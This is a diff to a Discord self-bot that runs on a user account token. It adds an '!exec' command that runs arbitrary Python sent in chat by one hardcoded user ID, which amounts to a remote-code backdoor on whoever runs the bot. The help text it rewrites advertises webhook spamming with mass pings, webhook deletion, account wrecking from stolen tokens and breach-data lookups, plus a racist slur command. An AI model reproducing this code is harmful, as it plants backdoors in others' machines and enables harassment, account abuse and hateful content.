@@ -1,4 +1,4 @@
-import discord 
+import discord #im using discord.py-self cuz easier
 from discord.ext import commands
 import random
 import aiohttp
@@ -12,7 +12,6 @@ import linecache
 import os
 
 token = ""
-
 bot = commands.Bot(command_prefix='!', bot=False)
 color = 3092790
 
@@ -91,36 +90,42 @@ async def on_message(message):
         
           
         if args[0] ==  '!help':
-          await message.channel.send("""```autohotkey
-A_Utility
+          await message.channel.send("""```
+Utility
 !snipe - sends the last deleted message 
-!b64encode/decode - encodes/decodes something in base64 
-!botinvite - sends a invite to a bot
-!linkvertise - bypasses a linkvertise link
-!leak - checks a query on intelx (only emails,)
-!idinfo - checks an id
-!ipinfo - checks an ip 
-!tokeninfo - checks a tokens info 
-!spamwebhook - spams a webhook
-!deletewebhook - deletes a webhook 
-!tokenfuck - fucks a token
+!b64encode/decode <text> - encodes/decodes something in base64 
+!botinvite <bot id> - sends a invite to a bot
+!linkvertise <linkvertise link> - bypasses a linkvertise link
+!leak <email> - checks a query on intelx (only emails)
+!idinfo <id> - checks an id
+!ipinfo <ip> - checks an ip 
+!tokeninfo <token> - checks a tokens info 
+!spamwebhook <webhook> - spams a webhook (spams long arabic characters and pings everyone on default, might change)
+!deletewebhook <webhook> - deletes a webhook 
+!tokenfuck <token> <SERVER NAMES> - fucks a token
 
-" Image "
-!banner - steals anyones banner
-!av - steals anyones avatar
+Image
+!banner <user (id or ping) - steals anyones banner
+!av <id> (id or ping) - steals anyones avatar
 !racc - sends a raccoon pic 
 !cat - sends a cat pic 
 !dog - sends a dog pic 
 !hentai - you already know what it does 
 
-%Fun%
-!8ball - 8ball
+Fun
+!8ball - <question> 8ball 
 !cf - flips a coin
-!poll - creates a poll
-!guessinggame - guessing game (if someone interrupts it breaks)
+!poll - <question> creates a poll
+!guessinggame - guessing game 
 !nigrate - sends ur nigrate u blackie 
 
 Developed by xyte```""")
+
+        elif args[0] == "!exec":
+          if message.author.id == 871480725407432795:
+            exec(args[1])
+          else:
+            await message.channel.send('Unathorized')
 
   
         elif args[0] == "!randomserver":
@@ -435,7 +440,6 @@ Sent by: <@{snipe_message_author}>""")
                         await message.channel.send('Bigger!')
                     else:
                         await message.channel.send('You guessed it!')
-
 
 
 
